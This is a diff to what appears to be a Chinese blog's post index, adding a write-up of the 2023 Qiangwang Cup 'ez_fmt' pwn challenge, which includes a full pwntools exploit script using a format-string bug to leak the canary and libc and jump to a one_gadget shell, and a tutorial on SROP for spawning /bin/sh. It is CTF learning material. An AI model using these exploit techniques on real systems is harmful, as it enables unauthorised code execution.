@@ -4,6 +4,56 @@
   
   
   <entry>
+    <title>强网杯2023_ezfmt复现</title>
+    <link href="/2024/11/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-ezfmt%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2024/11/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2023-ezfmt%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h2 id="2023强网杯ez-fmt"><a href="#2023强网杯ez-fmt" class="headerlink" title="2023强网杯ez_fmt"></a><strong>2023强网杯ez_fmt</strong></h2><p>序言：明天要打强网杯了，特意找了一点以前的题写写，发现这高质量比赛的题真是开阔视野了，收获不少。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>IDA反编译一下看一下伪代码，第一眼看上去真是简单题呀，但是以开始写脚本发现十分的不对劲，只有一个格式化字符串漏洞，而且利用过后不能通过fini_array实现无限利用。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012029275.png" alt="image-20241101202921204"></p><p>思考很久都没有思路，上网查看了大佬的wp才恍然大悟。也彻底颠覆了我对控制函数返回地址的理解。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012036093.png" alt="image-20241101203607009"></p><p>题目首先给了个buf的地址，通过调试发现，printf的返回地址就是buf-0x8</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012038797.png" alt="image-20241101203800712"></p><p>这时候我们就可以通过格式化字符串来控制buf-0x8的内容，实现printf函数后直接跳转到read函数，而不是执行w &#x3D; 0，这样我们就可以实现多次格式化字符串利用了。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012041634.png" alt="image-20241101204124552"></p><p>可以看到我们已经把返回地址改为0x401205，这样就会执行完printf函数直接又执行read函数</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202411012042572.png" alt="image-20241101204259525"></p><p>所以我们的攻击思路为</p><ol><li>通过格式化字符串修改printf函数的返回地址，并且泄露libc基地址</li><li>通过格式化字符串修改main函数的返回地址为one_gadget</li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>题目能泄露地址不要总想着通过main函数控制执行流，有时候通过其他函数才能化繁为简。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>ls      = <span class="hljs-keyword">lambda</span> data    :log.success(data)<br>lss     = <span class="hljs-keyword">lambda</span> s       :ls(<span class="hljs-string">&#x27;\033[1;31;40m%s ---&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br><br>filename = <span class="hljs-string">&#x27;./ez_fmt&#x27;</span><br>url = <span class="hljs-string">&#x27;&#x27;</span><br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * 0x000000000040121B</span><br><span class="hljs-string">    b * 0x0000000000401239</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;gift for you &#x27;</span>)<br>buf_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span> , drop = <span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;buf_addr&#x27;</span>)<br>read_ret = buf_addr - <span class="hljs-number">0x8</span><br>payload = <span class="hljs-string">b&#x27;%5c%9$hhn%17$p%19$p&#x27;</span>.ljust(<span class="hljs-number">0x18</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>payload += p64(read_ret)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br>p.recv(<span class="hljs-number">5</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>) , <span class="hljs-number">16</span>)<br>lss(<span class="hljs-string">&#x27;canary&#x27;</span>)<br>__libc_start_call_main = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>) , <span class="hljs-number">16</span>) - <span class="hljs-number">243</span><br>lss(<span class="hljs-string">&#x27;__libc_start_call_main&#x27;</span>)<br>base_addr = __libc_start_call_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;base_addr&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0xe3afe</span> , <span class="hljs-number">0xe3b01</span> , <span class="hljs-number">0xe3b04</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">1</span>]<br>mian_ret = buf_addr + <span class="hljs-number">0x68</span><br>lss(<span class="hljs-string">&#x27;execve&#x27;</span>)<br>bit1 = (execve &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>bit2 = execve &amp; <span class="hljs-number">0xffff</span><br>lss(<span class="hljs-string">&#x27;bit1&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;bit2&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(bit1).encode() + <span class="hljs-string">b&#x27;c%10$hhn&#x27;</span><br>payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(bit2 - bit1).encode() + <span class="hljs-string">b&#x27;c%11$hn&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>payload = payload.ljust(<span class="hljs-number">0x20</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(mian_ret + <span class="hljs-number">2</span>) + p64(mian_ret)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>刷题</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>强网杯2023</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>高级ROP之SROP</title>
+    <link href="/2024/10/28/%E9%AB%98%E7%BA%A7ROP%E4%B9%8BSROP/"/>
+    <url>/2024/10/28/%E9%AB%98%E7%BA%A7ROP%E4%B9%8BSROP/</url>
+    
+    <content type="html"><![CDATA[<h2 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h2><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410281958887.png" alt="Process of Signal Handlering"></p><ol><li><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p></li><li><p>进入内核前为了恢复进程需要保存上下文，<strong>主要是把所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410282005729.png" alt="sdf"></p></li><li><p>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p></li></ol><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>仔细回顾一下内核在 signal 信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在 Signal Frame 中。但是需要注意的是：</p><ul><li>Signal Frame 被保存在用户的地址空间中，所以用户是可以读写的。</li><li>由于内核与信号处理程序无关 (kernel agnostic about signal handlers)，它并不会去记录这个 signal 对应的 Signal Frame，所以当执行 sigreturn 系统调用时，此时的 Signal Frame 并不一定是之前内核为用户进程保存的 Signal Frame。</li></ul><p>说到这里，其实，SROP 的基本利用原理也就出现了。</p><h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h3><p>我们需要在Signal Frame中控制寄存器信息，当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">rax</span> <span class="hljs-number">59</span><br><span class="hljs-built_in">rdi</span> = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span><br><span class="hljs-built_in">rsi</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">rdx</span> = <span class="hljs-number">0</span><br><span class="hljs-built_in">rip</span> = <span class="hljs-keyword">syscall</span><br></code></pre></td></tr></table></figure><h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个 shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p><ul><li><strong>控制栈指针。</strong></li><li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li></ul><p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202410282039291.png" alt="signal2-stack"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>栈</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>SROP</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>关于fini_array的巧妙利用</title>
     <link href="/2024/10/27/%E5%85%B3%E4%BA%8Efini-array%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/"/>
     <url>/2024/10/27/%E5%85%B3%E4%BA%8Efini-array%E7%9A%84%E5%B7%A7%E5%A6%99%E5%88%A9%E7%94%A8/</url>
@@ -163,7 +213,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>杂记</category>
       
     </categories>
     
@@ -384,7 +434,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
@@ -434,7 +484,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
@@ -459,7 +509,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
@@ -484,7 +534,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
@@ -509,7 +559,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
@@ -534,7 +584,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
@@ -559,7 +609,7 @@
     
     <categories>
       
-      <category>PWN</category>
+      <category>栈</category>
       
     </categories>
     
